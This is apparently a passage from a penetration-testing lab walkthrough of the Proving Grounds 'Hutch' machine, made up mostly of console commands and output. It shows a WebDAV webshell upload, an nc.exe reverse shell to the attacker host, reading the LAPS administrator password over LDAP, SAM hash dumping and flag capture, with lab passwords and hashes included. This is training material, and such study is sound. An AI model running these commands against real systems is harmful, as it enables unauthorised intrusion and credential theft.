PUT File: http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.pl
PUT File: http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.asp
PUT File: http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.jhtml
PUT File: http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.cgi
PUT File: http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.jsp
PUT File: http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.cfm
PUT File: http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.shtml
PUT File: http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.html
PUT File: http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.txt
Executes: http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.aspx
Executes: http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.asp
Executes: http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.html
Executes: http://192.168.240.122/DavTestDir_ckRsG6d/davtest_ckRsG6d.txt
```

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# wget https://raw.githubusercontent.com/tennc/webshell/master/asp/webshell.asp                     
--2022-01-25 02:51:38--  https://raw.githubusercontent.com/tennc/webshell/master/asp/webshell.asp
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.111.133, 185.199.108.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1362 (1.3K) [text/plain]
Saving to: ‘webshell.asp’

webshell.asp                        100%[==================================================================>]   1.33K  --.-KB/s    in 0s      

2022-01-25 02:51:39 (60.5 MB/s) - ‘webshell.asp’ saved [1362/1362]
```   
```console                                                                                                                                            
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# curl -u fmcsorley:CrabSharkJellyfish192 -T webshell.asp http://192.168.240.122 
```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# curl -s http://192.168.240.122/webshell.asp?cmd=whoami | grep 192.168.240.122
\\HUTCHDC\IUSR192.168.240.122
192.168.240.122iis apppool\defaultapppool
```
```console
└─# impacket-smbserver folder . -smb2support -username admin -password admin
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (192.168.240.122,50053)
[*] AUTHENTICATE_MESSAGE (\admin,HUTCHDC)
[*] User HUTCHDC\admin authenticated successfully
[*] admin:::aaaaaaaaaaaaaaaa:bd8d0d7eb66af5a4e1d6c029948ba9a3:010100000000000080bed045c411d8017fd95ae755b648e500000000010010004a007200530076006500420066004600030010004a00720053007600650042006600460002001000570053004d005200610042006400670004001000570053004d00520061004200640067000700080080bed045c411d80106000400020000000800300030000000000000000000000000300000045db37bc65b39d9ab51ff84cc5f9ca033c6fd552b7ee93eb3f0a1813cadd1550a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340039002e003200340030000000000000000000
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:folder)
[*] Disconnecting Share(1:IPC$)
```

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# curl -s -X GET --data-urlencode 'cmd=net use Z: \\192.168.49.240\folder /u:admin admin' http://192.168.240.122/webshell.asp
<!--
ASP Webshell
Working on latest IIS 
Referance :- 
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp
http://stackoverflow.com/questions/11501044/i-need-execute-a-command-line-in-a-visual-basic-script
http://www.w3schools.com/asp/
-->

<HTML>
<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="">
<input type="submit" value="Run">
</FORM>
<PRE>
\\HUTCHDC\IUSR192.168.240.122
<p>
<b>The server's port:</b>
80
</p>
<p>
<b>The server's software:</b>
Microsoft-IIS/10.0
</p>
<p>
<b>The server's local address:</b>
192.168.240.122The command completed successfully.
```

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# curl -s -X GET --data-urlencode 'cmd=copy \\192.168.49.240\folder\nc.exe C:\Windows\Temp\nc.exe' http://192.168.240.122/webshell.asp     127 ⨯
<!--
ASP Webshell
Working on latest IIS 
Referance :- 
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.asp
http://stackoverflow.com/questions/11501044/i-need-execute-a-command-line-in-a-visual-basic-script
http://www.w3schools.com/asp/
-->

<HTML>
<BODY>
<FORM action="" method="GET">
<input type="text" name="cmd" size=45 value="">
<input type="submit" value="Run">
</FORM>
<PRE>
\\HUTCHDC\IUSR192.168.240.122
<p>
<b>The server's port:</b>
80
</p>
<p>
<b>The server's software:</b>
Microsoft-IIS/10.0
</p>
<p>
<b>The server's local address:</b>
192.168.240.122        1 file(s) copied.
```


```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# curl -s -X GET --data-urlencode 'cmd=C:\Windows\Temp\nc.exe 192.168.49.240 443 -e cmd.exe ' http://192.168.240.122/webshell.asp 
```
```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# rlwrap nc -lvnp 443
listening on [any] 443 ...

connect to [192.168.49.240] from (UNKNOWN) [192.168.240.122] 50123
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

whoami
whoami
iis apppool\defaultapppool

c:\windows\system32\inetsrv>


dir
 Volume in drive C has no label.
 Volume Serial Number is 0A26-9DC1

 Directory of c:\Users\fmcsorley\Desktop

11/03/2020  10:22 PM    <DIR>          .
11/03/2020  10:22 PM    <DIR>          ..
01/24/2022  11:44 PM                34 local.txt
               1 File(s)             34 bytes
               2 Dir(s)  13,333,651,456 bytes free

type local.txt
type local.txt
e2121bfc0a417e301208461ffe17725e

c:\Users\fmcsorley\Desktop>
```


```console
setspn -T active -Q */*
setspn -T active -Q */*
Ldap Error(0x51 -- Server Down): ldap_connect
Failed to retrieve DN for domain "active" : 0x00000051
Warning: No valid targets specified, reverting to current domain.
CN=HUTCHDC,OU=Domain Controllers,DC=hutch,DC=offsec
        Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/hutchdc.hutch.offsec
        ldap/hutchdc.hutch.offsec/ForestDnsZones.hutch.offsec
        ldap/hutchdc.hutch.offsec/DomainDnsZones.hutch.offsec
        DNS/hutchdc.hutch.offsec
        GC/hutchdc.hutch.offsec/hutch.offsec
        RestrictedKrbHost/hutchdc.hutch.offsec
        RestrictedKrbHost/HUTCHDC
        RPC/23e9aa2c-de86-42d4-a8a5-97043bdf445e._msdcs.hutch.offsec
        HOST/HUTCHDC/HUTCH
        HOST/hutchdc.hutch.offsec/HUTCH
        HOST/HUTCHDC
        HOST/hutchdc.hutch.offsec
        HOST/hutchdc.hutch.offsec/hutch.offsec
        E3514235-4B06-11D1-AB04-00C04FC2DCD2/23e9aa2c-de86-42d4-a8a5-97043bdf445e/hutch.offsec
        ldap/HUTCHDC/HUTCH
        ldap/23e9aa2c-de86-42d4-a8a5-97043bdf445e._msdcs.hutch.offsec
        ldap/hutchdc.hutch.offsec/HUTCH
        ldap/HUTCHDC
        ldap/hutchdc.hutch.offsec
        ldap/hutchdc.hutch.offsec/hutch.offsec
CN=krbtgt,CN=Users,DC=hutch,DC=offsec
        kadmin/changepw

Existing SPN found!
```

```console
                powershell -ExecutionPolicy Bypass -c "Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'ldap/hutchdc.hutch.offsec/hutch.offsec'; klist"
powershell -ExecutionPolicy Bypass -c "Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'ldap/hutchdc.hutch.offsec/hutch.offsec'; klist"


Id                   : uuid-b461537e-61a2-48ff-ba3b-3bb2fcd5f41c-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 1/25/2022 8:57:20 AM
ValidTo              : 1/25/2022 6:57:20 PM
ServicePrincipalName : ldap/hutchdc.hutch.offsec/hutch.offsec
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey


Current LogonId is 0:0xb4daa

Cached Tickets: (2)

#0>     Client: HUTCHDC$ @ HUTCH.OFFSEC
        Server: krbtgt/HUTCH.OFFSEC @ HUTCH.OFFSEC
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize 
        Start Time: 1/25/2022 0:57:20 (local)
        End Time:   1/25/2022 10:57:20 (local)
        Renew Time: 2/1/2022 0:57:20 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY 
        Kdc Called: HUTCHDC

#1>     Client: HUTCHDC$ @ HUTCH.OFFSEC
        Server: ldap/hutchdc.hutch.offsec/hutch.offsec @ HUTCH.OFFSEC
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40250000 -> forwardable pre_authent ok_as_delegate name_canonicalize 
        Start Time: 1/25/2022 0:57:20 (local)
        End Time:   1/25/2022 10:57:20 (local)
        Renew Time: 0
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0 
        Kdc Called: HUTCHDC



C:\Windows\Temp>
```

```console

C:\Program Files\LAPS>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0A26-9DC1

 Directory of C:\Program Files\LAPS

11/03/2020  09:59 PM    <DIR>          .
11/03/2020  09:59 PM    <DIR>          ..
09/22/2016  08:02 AM            64,664 AdmPwd.UI.exe
09/22/2016  08:02 AM            33,952 AdmPwd.Utils.dll
11/03/2020  09:59 PM    <DIR>          CSE
               2 File(s)         98,616 bytes
               3 Dir(s)  14,018,621,440 bytes free
```

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# ldapsearch -x -h 192.168.240.122 -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd        
# extended LDIF
#
# LDAPv3
# base <dc=hutch,dc=offsec> with scope subtree
# filter: (ms-MCS-AdmPwd=*)
# requesting: ms-MCS-AdmPwd 
#

# HUTCHDC, Domain Controllers, hutch.offsec
dn: CN=HUTCHDC,OU=Domain Controllers,DC=hutch,DC=offsec
ms-Mcs-AdmPwd: 8U-V#C7[Gm!W+V

# search reference
ref: ldap://ForestDnsZones.hutch.offsec/DC=ForestDnsZones,DC=hutch,DC=offsec

# search reference
ref: ldap://DomainDnsZones.hutch.offsec/DC=DomainDnsZones,DC=hutch,DC=offsec

# search reference
ref: ldap://hutch.offsec/CN=Configuration,DC=hutch,DC=offsec

# search result
search: 2
result: 0 Success

# numResponses: 5
# numEntries: 1
# numReferences: 3
```

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# crackmapexec smb 192.168.240.122 -u 'Administrator' -p '8U-V#C7[Gm!W+V'
SMB         192.168.240.122 445    HUTCHDC          [*] Windows 10.0 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.240.122 445    HUTCHDC          [+] hutch.offsec\Administrator:8U-V#C7[Gm!W+V (Pwn3d!)
```
```console                                                                                                               
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# crackmapexec smb 192.168.240.122 -u 'Administrator' -p '8U-V#C7[Gm!W+V' -x whoami
SMB         192.168.240.122 445    HUTCHDC          [*] Windows 10.0 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.240.122 445    HUTCHDC          [+] hutch.offsec\Administrator:8U-V#C7[Gm!W+V (Pwn3d!)
SMB         192.168.240.122 445    HUTCHDC          [-] Error starting SMB server on port 445: the port is already in use
SMB         192.168.240.122 445    HUTCHDC          [+] Executed command 
SMB         192.168.240.122 445    HUTCHDC          hutch\administrator
```

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# crackmapexec smb 192.168.240.122 -u 'Administrator' -p '8U-V#C7[Gm!W+V' --sam                                                2 ⨯
SMB         192.168.240.122 445    HUTCHDC          [*] Windows 10.0 Build 17763 x64 (name:HUTCHDC) (domain:hutch.offsec) (signing:True) (SMBv1:False)
SMB         192.168.240.122 445    HUTCHDC          [+] hutch.offsec\Administrator:8U-V#C7[Gm!W+V (Pwn3d!)
SMB         192.168.240.122 445    HUTCHDC          [+] Dumping SAM hashes
SMB         192.168.240.122 445    HUTCHDC          Administrator:500:aad3b435b51404eeaad3b435b51404ee:bab179eba40e413086aa37742476c646:::
SMB         192.168.240.122 445    HUTCHDC          Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.240.122 445    HUTCHDC          DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ERROR:root:SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
SMB         192.168.240.122 445    HUTCHDC          [+] Added 3 SAM hashes to the database
```                                                                                           

```console
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# smbmap -H 192.168.240.122 -u 'administrator' -p '9OWH04!7{N%Cs+' -d 'hutch.offsec' --download 'C$\Users\Administrator\Desktop\proof.txt'                  1 ⨯
[+] Starting download: C$\Users\Administrator\Desktop\proof.txt (34 bytes)
[+] File output to: /OSCPv3/offsec_pg/Hutch/192.168.240.122-C_Users_Administrator_Desktop_proof.txt
```
```console                                                                                                                                                                  
┌──(root💀kali)-[/OSCPv3/offsec_pg/Hutch]
└─# cat /OSCPv3/offsec_pg/Hutch/192.168.240.122-C_Users_Administrator_Desktop_proof.txt
340086859c97651ff804cbf4c5359f25
``` 


